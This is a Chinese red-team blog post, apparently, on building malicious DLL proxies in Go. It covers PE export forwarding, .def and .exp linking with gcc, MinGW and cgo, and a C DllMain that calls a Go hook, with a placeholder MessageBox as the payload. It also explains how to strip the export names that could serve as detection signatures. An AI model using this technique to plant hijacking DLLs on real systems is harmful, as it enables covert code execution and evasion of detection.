<!doctype html><html lang=zh dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>golang实现dll恶意劫持转发 | Akkuman 的博客</title>
<meta name=keywords content="golang,红队">
<meta name=description content="本文章将讲解如何使用恶意的 Golang 来实现 dll 劫持转发">
<meta name=author content>
<link rel=canonical href=//hacktech.cn/2021/07/22/golang-evil-dll-proxy/>
<link crossorigin=anonymous href=https://cdn.jsdelivr.net/gh/akkuman/akkuman.github.io@master/assets/css/stylesheet.min.2d7d75b9e2169b339e3eb6eaf518b7e5473045f05605aa42ea980b993db2ceae.css integrity="sha256-LX11ueIWmzOePrbq9Ri35UcwRfBWBapC6pgLmT2yzq4=" rel="preload stylesheet" as=style>
<link rel=icon href=//hacktech.cn/images/avatar.webp>
<link rel=icon type=image/png sizes=16x16 href=//hacktech.cn/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=//hacktech.cn/favicon-32x32.png>
<link rel=apple-touch-icon href=//hacktech.cn/apple-touch-icon.png>
<link rel=mask-icon href=//hacktech.cn/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.87.0">
<link rel=alternate hreflang=zh href=//hacktech.cn/2021/07/22/golang-evil-dll-proxy/>
<link rel=preconnect href=https://fonts.googleapis.cnpmjs.org>
<link rel=preconnect href=https://fonts.gstatic.cnpmjs.org crossorigin>
<link href="https://fonts.googleapis.cnpmjs.org/css2?family=Noto+Serif+SC&family=Source+Code+Pro&display=swap" rel=stylesheet>
<script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
<meta property="og:title" content="golang实现dll恶意劫持转发">
<meta property="og:description" content="本文章将讲解如何使用恶意的 Golang 来实现 dll 劫持转发">
<meta property="og:type" content="article">
<meta property="og:url" content="//hacktech.cn/2021/07/22/golang-evil-dll-proxy/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-07-22T02:01:02+00:00">
<meta property="article:modified_time" content="2021-07-22T02:01:02+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="golang实现dll恶意劫持转发">
<meta name=twitter:description content="本文章将讲解如何使用恶意的 Golang 来实现 dll 劫持转发">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//hacktech.cn/posts/"},{"@type":"ListItem","position":2,"name":"golang实现dll恶意劫持转发","item":"//hacktech.cn/2021/07/22/golang-evil-dll-proxy/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"golang实现dll恶意劫持转发","name":"golang实现dll恶意劫持转发","description":"本文章将讲解如何使用恶意的 Golang 来实现 dll 劫持转发\n","keywords":["golang","红队"],"articleBody":"本文章将讲解如何使用恶意的 Golang 来实现 dll 劫持转发\ndll 转发概述 dll 转发: 攻击者使用恶意dll替换原始dll，重命名原始dll并通过恶意dll将原先的功能转发至原始dll。\n该恶意dll一般用来专门执行攻击者希望拦截或修改的功能，同时将所有其他功能转发至原始dll\n一般可与 dll 劫持共同使用。\ndll 搜索顺序 首先我们来看一下 Windows 系统中 dll 的搜索顺序\n上图中攻击者可以控制的就是标准搜索顺序中的步骤，根据情况的不同我们可以选择不同的方式来进行 dll 劫持\n步骤 要实现 dll 转发，一般需要以下一些步骤\n 解析原始 dll 的导出表 收集出要拦截修改的函数 在恶意 dll 中实现拦截功能 将所有其他函数转发至原始 dll 上 重命名原始 dll 使用原始 dll 的名称重命名恶意 dll  PE 文件导出表 什么是 PE 导出表？ 导出表就是当前的 PE 文件提供了哪些函数给别人调用。\n并不只有 dll 才有导出表，所有的 PE 文件都可以有导出表，exe 也可以导出函数给别人使用，一般情况而言 exe 没有，但并不是不可以有\n导出表在哪里？ PE 文件格式在这里并不进行详细介绍，感兴趣的读者可以自行查阅相关资料。\nPE 文件包含 DOS 头和 PE 头，PE 头里面有一个扩展头，这里面包含了一个数据目录（包含每个目录的VirtualAddress和Size的数组。目录包括：导出、导入、资源、调试等），从这个地方我们就能够定位到导出表位于哪里\n导出表的结构 接下来我们看看导出表的结构\n1 2 3 4 5 6 7 8 9 10 11 12 13  typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; //时间戳. 编译的时间. 把秒转为时间.可以知道这个DLL是什么时候编译出来的.  WORD MajorVersion; WORD MinorVersion; DWORD Name;　//指向该导出表文件名的字符串,也就是这个DLL的名称 辅助信息.修改不影响 存储的RVA 如果想在文件中查看.自己计算一下FOA即可.  DWORD Base; // 导出函数的起始序号  DWORD NumberOfFunctions; //所有的导出函数的个数  DWORD NumberOfNames; //以名字导出的函数的个数  DWORD AddressOfFunctions; // 导出的函数地址的 地址表 RVA 也就是 函数地址表  DWORD AddressOfNames; // 导出的函数名称表的 RVA 也就是 函数名称表  DWORD AddressOfNameOrdinals; // 导出函数序号表的RVA 也就是 函数序号表 } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;   我们使用cff explorer看看dll的导出表\n可惜从这个图上我们并不能观察出导出的函数是否是一个转发函数，我们使用16进制编辑器打开看看\n从这个图上我们可以看到 add 导出函数前面还有一些东西 _lyshark.dll._lyshark.add.add\n这个标识告诉我们这个 dll 的导出函数 add 实际上位于 _lyshark.dll 上\ndll 转发如何工作 当我们调用转发函数时，Windows加载程序将检查该 dll（即恶意 dll）所引用的 dll（即原始dll）是否已加载，如果引用的 dll 还没有加载到内存中，Windows加载程序将加载这个引用的 dll，最后搜索该导出函数的真实地址，以便我们调用它\ndll 转发（dll 劫持）的一般实现 我们能在网上搜索到一些 dll 转发（dll 劫持）的实现，基本是使用微软 MSVC 编译器的特殊能力4\nMSVC 支持在 cpp 源文件中写一些链接选项，类似\n1  #progma comment(linker, \"/export:FUNCTION_NAME=要转发的dll文件名.FUNCTION_NAME\")   列出导出函数 下面我们采用 MSVC 对 zlib.dll 实现一个样例5\n首先我们能使用 DLL Export Viewer 工具查看并导出一个 dll 的导出表\n然后我们点击 View  HTML Report - All Functions\n我们可以得到一个类似于下面的 html\n给 MSVC 链接器生成导出指令 我们现在可以把这个 html 转化为 MSVC 的导出指令5\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  \"\"\" The report generated by DLL Exported Viewer is not properly formatted so it can't be analyzed using a parser unfortunately. \"\"\" from __future__ import print_function import argparse def main(): parser = argparse.ArgumentParser(description=\"DLL Export Viewer - Report Parser\") parser.add_argument(\"report\", help=\"the HTML report generated by DLL Export Viewer\") args = parser.parse_args() report = args.report try: f = open(report) page = f.readlines() f.close() except: print(\"[-] ERROR: open('%s')\" % report) return for line in page: if line.startswith(\"\"): cols = line.replace(\"\", \"\").split(\"\") function_name = cols[1] ordinal = cols[4].split(' ')[0] dll_orig = \"%s_orig\" % cols[5][:cols[5].rfind('.')] print(\"#pragma comment(linker,\\\"/export:%s=%s.%s,@%s\\\")\" % (function_name, dll_orig, function_name, ordinal)) if __name__ == '__main__': main()   然后我们可以获得这样的输出\n下面的具体怎么生成不再进行介绍，如果感兴趣可以查看 Windows Privilege Escalation - DLL Proxying 或 基于AheadLib工具进行DLL劫持\ndll 转发（dll 劫持）的 mingw 实现 如果有的人和我一样，不喜欢安装庞大的 Visual Studio，习惯用 gcc mingw 来完成，我们也是能够完成的\ndef 文件介绍 这里我们使用 gcc 编译器和 mingw-w64（这个是mingw的改进版）\n此处我们不再采用直接把链接指令写入代码源文件的方式，而是采用模块定义文件 (.Def)\n模块定义 (.def) 文件为链接器提供有关导出、属性和有关要链接的程序的其他信息的信息。.def 文件在构建 DLL 比较有用。详情可参见 MSDN Module-Definition (.Def) Files\n当然，我们采用这种方式的原因是因为 .def 能被 mingw-w64 所支持，我们要做的就是在.def文件中写入我们要转发到原始dll的所有函数的列表，并在编译dll的时候在GCC中设置该 .def 文件参与链接。\n简单的示例 实现流程 这里我们采用一个简单的样例，我们采用常规写了一个 dll, 该 dll 文件导出一个 add 函数，该导出函数的作用就是把传入的两个数值进行相加\n1 2 3 4 5 6 7 8 9 10 11 12  #include  extern \"C\" int __declspec(dllexport)add(int x, int y) { return x + y; } BOOL APIENTRY DllMain(HANDLE handle, DWORD dword, LPVOID lpvoid) { return true; }   我们将它编译成 dll 文件\n1  gcc add.cpp -shared -o add.dll   然后我们写一个主程序来调用它\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  #include #include  typedef int(*lpAdd)(int, int); int main(int argc, char *argv[]) { HINSTANCE DllAddr; lpAdd addFun; DllAddr = LoadLibraryW(L\"add.dll\"); addFun = (lpAdd)GetProcAddress(DllAddr, \"add\"); if (NULL != addFun) { int res = addFun(100, 200); printf(\"result: %d \\n\", res); } FreeLibrary(DllAddr); system(\"pause\"); return 0; }   然后我们进行编译执行\n1 2  gcc main.cpp -o main.exe ./main.exe   可以看到如下输出\n然后我们将我们刚才生成的 add.dll 重命名为 _add.dll\n然后创建一个 .def 文件\nfunctions.def\n1 2 3  LIBRARY _add.dll EXPORTS add = _add.add @1   LIBRARY _add.dll 代表转发到 _add.dll，下面的 EXPORTS 定义了需要转发的函数，= 前面是导出函数名，= 后面的 _add 代表要转发到的 dll 的名称，add 代表要转发到 _add.dll 的哪一个导出函数，关键在于 @1\n我们可以拿 DLL Export Viewer 或 StudyPE+ 等工具看看\n我们可以看到 Ordinal, 这个是导出函数序号，就是 @1 的来源，如果有多个导出函数，依次写下来即可\n然后编写我们的恶意 dll\n1 2 3 4 5 6 7  #include  BOOL APIENTRY DllMain(HANDLE handle, DWORD dword, LPVOID lpvoid) { return true; }   如上所示，当然，这只是一个样例，所以我并没有写下任何恶意代码\n现在可以编译我们的恶意dll了\n1  gcc -shared -o add.dll evil.cpp functions.def    -shared表示我们要编译一个共享库（非静态） -o指定可执行文件的输出文件名 add.dll是我们想给我们的恶意 dll 起的名字 evil.cpp是我们在其中编写恶意 dll 代码的 .cpp 文件  如果编译成功的话，你应该能在同目录下找到刚刚生成好的恶意 dll（add.dll）\n我们再使用 PE 查看工具看看导出表\n可以看到中转输出表上已经有了\n注意我们这个 dll 并没有写任何功能性代码，让我们使用刚才编译的 main.exe 测试一下\n可以发现功能转发正常\n当然，当导出函数过多的时候我们不可能一个个自己去导出表里抄，可以写一个脚本自动化完成这个工作，不过这不是我们本文的重点，或者你可以使用 mingw-w64 里面自带的 gendef.exe 工具\n.def 和 .exp 文件 exp：\n文件是指导出库文件的文件，简称导出库文件，它包含了导出函数和数据项的信息。当LIB创建一个导入库，同时它也创建一个导出库文件。如果你的程序链接到另一个程序，并且你的程序需要同时导出和导入到另一个程序中，这个时候就要使用到exp文件(LINK工具将使用EXP文件来创建动态链接库)。\ndef：\ndef文件的作用即是，告知编译器不要以microsoft编译器的方式处理函数名，而以指定的某方式编译导出函数（比如有函数func，让编译器处理后函数名仍为func）。这样，就可以避免由于microsoft VC++编译器的独特处理方式而引起的链接错误。\n从上面的介绍中我们可以看出 .exp 文件可以用在链接阶段，所以我们可以先使用 dlltool 工具将 .def 转化为 .exp 文件，然后编译 evil.cpp 到 evil.o 再手动进行链接。\n1 2 3  gcc -c -O3 evil.cpp dlltool --output-exp functions.exp --input-def functions.def ld -o add.dll functions.exp evil.o   额外的说明 当然，你也可以通过 clang 来完成这项工作\n1  clang -shared evil.cpp -o add.dll -Wl\"/DEF:functions.def\"   我们如何用 Golang 来实现转发 dll Golang 提供了官方的动态链接库（dll）编译命令 go build -buildmode=c-shared -o exportgo.dll exportgo.go，根据我们前面铺垫的基础，现阶段所需要思考的是：如何把 .def 文件或 .exp 文件也带入进去？\n下文我将用 gcc 作为 cgo 的外部链接器，clang也可以按照同样的思想\n尝试与思考 为什么不考虑利用cgo直接在c代码中写 #progma comment(linker, '/EXPORT')，这个的主要原因是 Golang 的 cgo 能力现阶段只支持 clang 和 gcc，MSVC编译器并不支持9。\n让我们现在来思考一下整个编译流程：\n 预处理 预处理用于将所有的#include头文件以及宏定义替换成其真正的内容 编译 将经过预处理之后的程序转换成特定汇编代码(assembly code)的过程 汇编 汇编过程将上一步的汇编代码转换成机器码(machine code)，这一步产生的文件叫做目标文件，是二进制格式。gcc汇编过程通过as命令完成，这一步会为每一个源文件产生一个目标文件 链接 链接过程将多个目标文以及所需的库文件(.so等)链接成最终的可执行文件(executable file)。  前三步都是在将代码处理成二进制机器码，而我们所要操控的导出表是属于文件格式的一部分，所以应该是需要在链接这个步骤做文章\n借助这个思路，我们对上面的样例做做文章。\n首先把我们的 evil.cpp 编译汇编成目标文件，然后链接时加入额外控制。\n1 2 3 4  # evil.cpp 编译汇编成 evil.o 目标文件（下面的 -O3 是为了启用 O3 优化，可选） gcc -c O3 evil.cpp # 和 .def 文件一起进行链接 ld -o add.dll functions.def evil.o   或者利用上文中先将 .def 转化成 .exp 再进行手动链接，我们均能得到我们预期的转发dll。\ngolang 中的实现 我们的目的是需要把 .def 或 .exp 文件放入整个编译流程的链接环节中去。\n首先我们需要先了解一下 cgo 的工作方式11：它用c编译器编译c，用Go编译器编译Go，然后使用 gcc 或 clang 将他们链接在一起，我们甚至能够通过 CGO_LDFLAGS 来将flag传递至链接器。\n在我们Golang程序编译命令中，相信大家使用过 -ldflags=\"\" 选项，这个其实是 go tool link 带来的，go build 只是一个前端，Go 提供了一组低级工具来编译和链接程序，go build只需收集文件并调用这些工具。我们可以通过使用-x标志来跟踪它的作用。不过这里我们并不关心这个。\n我们去看看 go tool link的说明书，帮助文件里面提到了\n1 2 3 4  -extld linker Set the external linker (default \"clang\" or \"gcc\"). -extldflags flags Set space-separated flags to pass to the external linker.   -extld 一般我们不需要更改，也就是我们只需要想办法修改 -extldflags 让链接过程带入我们的 .def 或 .exp 文件即可。\n但是，我们刚才使用 ld 编译的时候，都是直接将 .def 或 .exp 文件传入的，如何通过 ld 的参数传入呢？\n在 gcc 的链接选项 里，有一个选项是 -Wl，用法为 -Wl,option，它的作用就是将-Wl后的option作为标识传递给 ld 命令，如果 option 中包含 ,，则根据 , 拆分为多个标识传递给 ld，可能看到这里你对于这个选项还是一知半解，下面举个例子\n1 2  gcc -c evil.cpp ld -o add.dll functions.def evil.o   等同于\n1  gcc -shared -o add.dll -Wl,functions.def evil.cpp   等同于\n1  gcc -shared -Wl,functions.def,-o,add.dll evil.cpp   也就是 -Wl 后面的东西都会传递链接器\n所以我们将 .def 或 .exp 文件利用 -Wl 选项设置到 -extldflags 上去即可。\n所以我们现在可以创建一个样例 go 程序用来编译 dll\nmain.go\n1 2 3 4 5 6 7  package main import \"C\" func main() { // Need a main function to make CGO compile package as C shared library }   然后进行编译\n1  go build -buildmode=c-shared -o add.dll -ldflags=\"-extldflags=-Wl,C:/Users/Akkuman/Desktop/go-dll-proxy/article/functions.def\" main.go   注意：-Wl后面要写上 .def 或 .exp 文件的绝对路径，主要是由于调用程序时候的工作路径问题，只需要记住这一点即可。\n现在我们得到了一个 golang 编译出来的转发dll\n当然，你可能会对那个 _cgo_dummy_export 导出函数比较疑惑，这个是golang编译的dll所特有的，如果你想要去除掉它，可以使用 .exp 来进行链接\n1  go build -buildmode=c-shared -o add.dll -ldflags=\"-extldflags=-Wl,C:/Users/Akkuman/Desktop/go-dll-proxy/article/functions.exp\" main.go   dll 转发的总结 其实 cgo 主要的编译手段为：用c编译器编译c，用Go编译器编译Go，然后使用 gcc 或 clang 将他们链接在一起。我们所需要做的只是将它们粘合在一起。\n在 Golang 中如何实现恶意 dll 我们已经知道了该怎么在 Golang 中实现转发 dll，接下来我们可以尝试实现恶意 dll 了。\ninit 写法 如果你看这篇文章，相信你已经知道 Go 会默认执行包中的 init() 方法。所以我们可以把我们的恶意代码定义到这个函数里面去。\n一般的dll实现方式为\n1 2 3 4 5 6 7 8 9  package main func Add(x, y int) int { return x + y } func main() { // Need a main function to make CGO compile package as C shared library }   我们只需要加上一个 init 方法，并且让恶意代码异步执行即可（防止 LoadLibrary 卡住）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  package main func init() { go func() { // 你的恶意代码  }() } func Add(x, y int) int { return x + y } func main() { // Need a main function to make CGO compile package as C shared library }   对于 windows dll 更细粒度的控制 对于windows dll，DllMain11 是一个可选的入口函数\n对于 DllMain 的介绍，我这里就不再赘述了，感兴趣的可以自行进行查询\n系统是在什么时候调用DllMain函数的呢？静态链接或动态链接时调用LoadLibrary和FreeLibrary都会调用DllMain函数。DllMain的第二个参数fdwReason指明了系统调用Dll的原因，它可能是:：\n DLL_PROCESS_ATTACH: 当一个DLL文件首次被映射到进程的地址空间时 DLL_PROCESS_DETACH: 当DLL被从进程的地址空间解除映射时 DLL_THREAD_ATTACH: 当进程创建一线程时，第n(n=2)次以后地把DLL映像文件映射到进程的地址空间时，是不再用DLL_PROCESS_ATTACH调用DllMain的。而DLL_THREAD_ATTACH不同，进程中的每次建立线程，都会用值DLL_THREAD_ATTACH调用DllMain函数，哪怕是线程中建立线程也一样 DLL_THREAD_DETACH: 如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread），系统查看当前映射到进程空间中的所有DLL文件映像，并用DLL_THREAD_DETACH来调用DllMain函数，通知所有的DLL去执行线程级的清理工作  这些流程根据你自己的需求来进行控制。当然，如果你有过 Windows 编程经验，应该对这个比较熟悉。\nGolang 是一个有 GC 的语言，需要在加载时运行 Golang 本身的运行时，所以暂时没有太好的方案在 Golang 中实现 DllMain 让外层直接调用入口点，因为没有初始化运行时。\n我们可以变相通过 cgo 来实现这个目的。总体思路为，利用 C 来写 DllMain，通过 c 来调用 Golang 的函数\n以下示例代码大多来自 github.com/NaniteFactory/dllmain\nc 实现 DllMain 首先我们可以在 c 中定义我们自己的 DllMain\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  #include \"dllmain.h\" typedef struct { HINSTANCE hinstDLL; // handle to DLL module  DWORD fdwReason; // reason for calling function // reserved  LPVOID lpReserved; // reserved } MyThreadParams; DWORD WINAPI MyThreadFunction(LPVOID lpParam) { MyThreadParams params = *((MyThreadParams*)lpParam); OnProcessAttach(params.hinstDLL, params.fdwReason, params.lpReserved); free(lpParam); return 0; } BOOL WINAPI DllMain( HINSTANCE _hinstDLL, // handle to DLL module  DWORD _fdwReason, // reason for calling function  LPVOID _lpReserved) // reserved { switch (_fdwReason) { case DLL_PROCESS_ATTACH: // Initialize once for each new process.  // Return FALSE to fail DLL load.  { MyThreadParams* lpThrdParam = (MyThreadParams*)malloc(sizeof(MyThreadParams)); lpThrdParam-hinstDLL = _hinstDLL; lpThrdParam-fdwReason = _fdwReason; lpThrdParam-lpReserved = _lpReserved; HANDLE hThread = CreateThread(NULL, 0, MyThreadFunction, lpThrdParam, 0, NULL); // CreateThread() because otherwise DllMain() is highly likely to deadlock.  } break; case DLL_PROCESS_DETACH: // Perform any necessary cleanup.  break; case DLL_THREAD_DETACH: // Do thread-specific cleanup.  break; case DLL_THREAD_ATTACH: // Do thread-specific initialization.  break; } return TRUE; // Successful. }   注意此处最好使用 CreateThread 来进行外部 Go 函数的调用，不然可能因为初始化 Go 运行时的问题导致死锁。\n我们在该代码中 DLL_PROCESS_ATTACH 时异步调用了 OnProcessAttach，我们在 Golang 中实现这个恶意函数\nGolang 恶意代码 我们现在来定义我们的恶意代码实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  package main import \"C\" import ( \"unsafe\" \"syscall\" ) // MessageBox of Win32 API. func MessageBox(hwnd uintptr, caption, title string, flags uint) int { ret, _, _ := syscall.NewLazyDLL(\"user32.dll\").NewProc(\"MessageBoxW\").Call( uintptr(hwnd), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))), uintptr(flags)) return int(ret) } // MessageBoxPlain of Win32 API. func MessageBoxPlain(title, caption string) int { const ( NULL = 0 MB_OK = 0 ) return MessageBox(NULL, caption, title, MB_OK) } // OnProcessAttach is an async callback (hook). //export OnProcessAttach func OnProcessAttach( hinstDLL unsafe.Pointer, // handle to DLL module \tfdwReason uint32, // reason for calling function \tlpReserved unsafe.Pointer, // reserved ) { MessageBoxPlain(\"OnProcessAttach\", \"OnProcessAttach\") } func main() { // Need a main function to make CGO compile package as C shared library }   此处我们实现了恶意函数 OnProcessAttach，只是弹个窗来模拟恶意代码。\n组合 Golang 和 c 编译 现在我们有了 .go 和 .c，还需要把它们两个粘合起来\n第一种方案 你可以通过 cgo 的一般写法，在 .go 的注释中把 c 代码拷贝进去，例如\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  package main /* #include \"dllmain.h\" typedef struct { HINSTANCE hinstDLL; // handle to DLL module DWORD fdwReason; // reason for calling function // reserved LPVOID lpReserved; // reserved } MyThreadParams; DWORD WINAPI MyThreadFunction(LPVOID lpParam) { MyThreadParams params = *((MyThreadParams*)lpParam); OnProcessAttach(params.hinstDLL, params.fdwReason, params.lpReserved); free(lpParam); return 0; } ...c源码文件 */ import \"C\" import ( \"unsafe\" \"syscall\" ) // MessageBox of Win32 API. func MessageBox(hwnd uintptr, caption, title string, flags uint) int { ret, _, _ := syscall.NewLazyDLL(\"user32.dll\").NewProc(\"MessageBoxW\").Call( uintptr(hwnd), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))), uintptr(flags)) return int(ret) } ...go 源码文件   第二种方案 或者你也可以给 .c 写一个头文件 .h，然后在 .go 中导入这个头文件，在 go build 的时候 Go 编译器会默认找到该目录下的 .c、.h、.go 一起编译。\n比如你可以创建一个 .h 文件\n1 2 3 4 5 6 7 8 9  #include  void OnProcessAttach(HINSTANCE, DWORD, LPVOID); BOOL WINAPI DllMain( HINSTANCE _hinstDLL, // handle to DLL module  DWORD _fdwReason, // reason for calling function  LPVOID _lpReserved // reserved );   然后在 .go 中引用它\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  package main /* #include \"dllmain.h\" */ import \"C\" import ( \"unsafe\" \"syscall\" ) // MessageBox of Win32 API. func MessageBox(hwnd uintptr, caption, title string, flags uint) int { ret, _, _ := syscall.NewLazyDLL(\"user32.dll\").NewProc(\"MessageBoxW\").Call( uintptr(hwnd), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))), uintptr(flags)) return int(ret) }   然后就可以一起编译了。\n导出表的问题 确实，现在我们可以编译出恶意的转发dll了，但是我们可能会发现导出表里面其实有很多奇奇怪怪的导出函数\n这些导出函数可能会成为某些特征\n我们的原始dll并没有这些导出函数，但是生成的转发dll这么多奇怪的导出函数该怎么去掉？\n我们可以同样可以使用上文的 exp 文件来解决，它就是一个导出库文件，来定义有哪些导出的。\n根据上文的方法我们使用 dlltool 从 def 文件生成一个 exp 文件，然后编译时加入链接即可。\n1  go build -buildmode=c-shared -o add.dll -ldflags=\"-extldflags=-Wl,/home/lab/Repo/go-dll-proxy/dllmain/functions.exp -s -w\"   ldflags 里面的新增的 -s -w 只是为了减小一点体积去除一下符号，可选。\n最后的最后 仓库相关示例已经上传至 github.com/akkuman/go-dll-evil\n感兴趣的可以查看。\n参考资料  [1] PE知识复习之PE的导出表 [2] DLL Proxying [3] /EXPORT (Exports a Function) [4] Windows Privilege Escalation - DLL Proxying [5] DLL Hijacking using DLL Proxying technique [6] DLL之def和exp文件作用 [7] mingw环境中使用dlltool工具来生成动态库的步骤 [8] Specifying the DEF file when compiling a DLL with Clang [9] issues - cmd/link: support msvc object files [10] gcc Options for Linking [11] RUSTGO: CALLING RUST FROM GO WITH NEAR-ZERO OVERHEAD [12] Go Execution Modes [13] go tool link [14] DllMain entry point [15] DllMain简介和DLL编写说明 [16] Call Go function from C function [17] github.com/NaniteFactory/dllmain [18] How to implement DllMain entry point in Go ","wordCount":"1877","inLanguage":"zh","datePublished":"2021-07-22T02:01:02Z","dateModified":"2021-07-22T02:01:02Z","mainEntityOfPage":{"@type":"WebPage","@id":"//hacktech.cn/2021/07/22/golang-evil-dll-proxy/"},"publisher":{"@type":"Organization","name":"Akkuman 的博客","logo":{"@type":"ImageObject","url":"//hacktech.cn/images/avatar.webp"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<noscript>
<style type=text/css>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=//hacktech.cn/ accesskey=h title="Akkuman 的博客 (Alt + H)">Akkuman 的博客</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
<ul class=lang-switch><li>|</li>
<li>
<a href=//hacktech.cn/en/ title=English aria-label=English>En</a>
</li>
</ul>
</span>
</div>
<ul id=menu>
<li>
<a href=//hacktech.cn/archives/ title=归档>
<span>归档</span>
</a>
</li>
<li>
<a href=//hacktech.cn/categories/ title=分类>
<span>分类</span>
</a>
</li>
<li>
<a href=//hacktech.cn/search/ title=搜索>
<span>搜索</span>
</a>
</li>
<li>
<a href=//hacktech.cn/tags/ title=标签>
<span>标签</span>
</a>
</li>
<li>
<a href=//hacktech.cn/links/ title=链接>
<span>链接</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=//hacktech.cn/>主页</a>&nbsp;»&nbsp;<a href=//hacktech.cn/posts/>Posts</a></div>
<h1 class=post-title>
golang实现dll恶意劫持转发
</h1>
<div class=post-meta>July 22, 2021&nbsp;·&nbsp;9 分钟&nbsp;|&nbsp;<a href="mailto://akkumans@qq.com?subject=Suggesting%20changes%20for%20/posts/golang-evil-dll-proxy.md" rel="noopener noreferrer" target=_blank>给我邮件</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<div class=details>目录</div>
</summary>
<div class=inner><ul>
<li>
<a href=#dll-%e8%bd%ac%e5%8f%91%e6%a6%82%e8%bf%b0 aria-label="dll 转发概述">dll 转发概述</a><ul>
<li>
<a href=#dll-%e6%90%9c%e7%b4%a2%e9%a1%ba%e5%ba%8f aria-label="dll 搜索顺序">dll 搜索顺序</a></li>
<li>
<a href=#%e6%ad%a5%e9%aa%a4 aria-label=步骤>步骤</a></li></ul>
</li>
<li>
<a href=#pe-%e6%96%87%e4%bb%b6%e5%af%bc%e5%87%ba%e8%a1%a8 aria-label="PE 文件导出表">PE 文件导出表</a><ul>
<li>
<a href=#%e4%bb%80%e4%b9%88%e6%98%af-pe-%e5%af%bc%e5%87%ba%e8%a1%a8 aria-label="什么是 PE 导出表？">什么是 PE 导出表？</a></li>
<li>
<a href=#%e5%af%bc%e5%87%ba%e8%a1%a8%e5%9c%a8%e5%93%aa%e9%87%8c aria-label=导出表在哪里？>导出表在哪里？</a></li>
<li>
<a href=#%e5%af%bc%e5%87%ba%e8%a1%a8%e7%9a%84%e7%bb%93%e6%9e%84 aria-label=导出表的结构>导出表的结构</a></li></ul>
</li>
<li>
<a href=#dll-%e8%bd%ac%e5%8f%91%e5%a6%82%e4%bd%95%e5%b7%a5%e4%bd%9c aria-label="dll 转发如何工作">dll 转发如何工作</a></li>
<li>
<a href=#dll-%e8%bd%ac%e5%8f%91dll-%e5%8a%ab%e6%8c%81%e7%9a%84%e4%b8%80%e8%88%ac%e5%ae%9e%e7%8e%b0 aria-label="dll 转发（dll 劫持）的一般实现">dll 转发（dll 劫持）的一般实现</a><ul>
<li>
<a href=#%e5%88%97%e5%87%ba%e5%af%bc%e5%87%ba%e5%87%bd%e6%95%b0 aria-label=列出导出函数>列出导出函数</a></li>
<li>
